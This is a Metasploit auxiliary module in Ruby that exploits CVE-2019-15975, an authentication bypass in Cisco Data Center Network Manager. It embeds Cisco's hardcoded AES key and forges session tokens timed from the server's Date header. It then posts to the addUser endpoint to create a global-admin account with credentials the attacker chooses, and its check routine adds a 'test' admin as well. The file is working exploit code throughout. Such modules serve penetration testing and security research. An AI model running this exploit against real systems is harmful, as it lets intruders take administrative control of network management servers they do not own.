##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'securerandom'
require 'base64'

class MetasploitModule < Msf::Auxiliary

  include Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Cisco DCNM auth bypass',
        'Description' => %q{
          This exploit is able to add an admin account to a Cisco DCNM with credentials you can choose.
          After that, you can login to the web interface with those credentials.
          The only necessary condition is the more or less recent connection of an admin as this exploit
          uses a kind of session stealing.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'MR_ME', # Amazing POC on www.exploit-db.com
          'Yann Castel (yann.castel[at]orange.com)' # Metasploit module
        ],
        'References' => [
          [ 'CVE', '2019-15975'],
          [ 'EDB', '48018']
        ],
        'DisclosureDate' => '2020-06-01',
        'DefaultOptions' => { 'SSL' => true },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]
        }
      )
    )

    register_options([
      Opt::RPORT(443),
      OptInt.new('RETRIES', [true, 'Retry count for the attack', 50]),
      OptString.new('TARGETURI', [true, 'The base path of the Cisco DCNM', '/']),
      OptString.new('USERNAME', [true, 'The username of the admin account you want to add', Faker::Internet.username(specifier: 8..10).gsub(/[^a-zA-Z0-9]/, '')]),
      OptString.new('PASSWORD', [true, 'The password of the admin account you want to add', Faker::Internet.password(min_length: 8, max_length: 10)])
    ])
  end

  KEY = 's91zEQmb305F!90a'.freeze

  class AESCipher
    def initialize
      # Cisco's hardcoded key
      @bs = 16
    end

    def encrypt(raw)
      raw = _pad(raw)
      iv = "\x00" * 0x10
      cipher = OpenSSL::Cipher.new('aes-128-cbc')
      cipher.encrypt
      cipher.key = KEY
      cipher.iv = iv
      Base64.encode64(cipher.update(raw))
    end

    private

    def _pad(size)
      size + (@bs - size.length % @bs).chr.to_s * (@bs - size.length % @bs)
    end
  end

  def make_raw_token
    key = 'what_a_nice_key'
    uuid = SecureRandom.uuid.gsub('-', '')[0..20]
    time = leak_time
    raw_token = format('%<key>s-%<uuid>s-%<time>s', key: key, uuid: uuid, time: time)
    raw_token
  end

  def bypass_auth(token, usr, pwd)
    d = {
      'userName' => usr,
      'password' => pwd,
      'roleName' => 'global-admin'
    }
    h = { 'afw-token' => token }

    r = send_request_cgi({
      'method' => 'POST',
      'headers' => h,
      'vars_post' => d,
      'uri' => normalize_uri(target_uri.path + 'fm/fmrest/dbadmin/addUser')
    })

    if r && r.body != 'Access denied'

      json = r.get_json_document

      case json&.dig('resultMessage')
      when 'Success'
        return :success
      when 'User already exists.'
        return :user_already_exists
      when 'Cannot add user since password strength check failed'
        return :weak_password
      end
    else
      return :failed_to_connect
    end
    :fail
  end

  def leak_time
    r = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path)
    })

    fail_with(Failure::Unreachable, "Target #{rhost} could not be reached.") unless r

    r_time = DateTime.strptime(r.headers['Date'][0..-4], '%a, %d %b %Y %H:%M:%S').strftime('%s')
    r_time
  end

  def add_admin_account(usr, pwd)
    res = -1

    datastore['RETRIES'].times do
      raw = make_raw_token

      cryptor = AESCipher.new
      token = cryptor.encrypt(raw).gsub("\n", '')
      res = bypass_auth(token, usr, pwd)
      if res != :fail && res != :failed_to_connect

        return res
      end
    end
    print_error("Didn't succeed after #{datastore['RETRIES']} attempts")
    res
  end

  def check
    res = add_admin_account('test', 'test')

    if res == :success || res == :user_already_exists || res == :weak_password
      Exploit::CheckCode::Vulnerable
    elsif res == :failed_to_connect
      Exploit::CheckCode::Safe
    else
      Exploit::CheckCode::Unknown
    end
  end

  def run
    res = add_admin_account(datastore['USERNAME'], datastore['PASSWORD'])
    if res == :success
      print_good("Admin account with username: '#{datastore['USERNAME']}' and password: '#{datastore['PASSWORD']}' added!")
    elsif res == :weak_password
      print_error('Unable to add admin account due to bad password strength')
    elsif res == :user_already_exists
      print_error('Unable to add admin account because this username already exists')
    else
      print_error('Something went wrong')
    end
  end
end
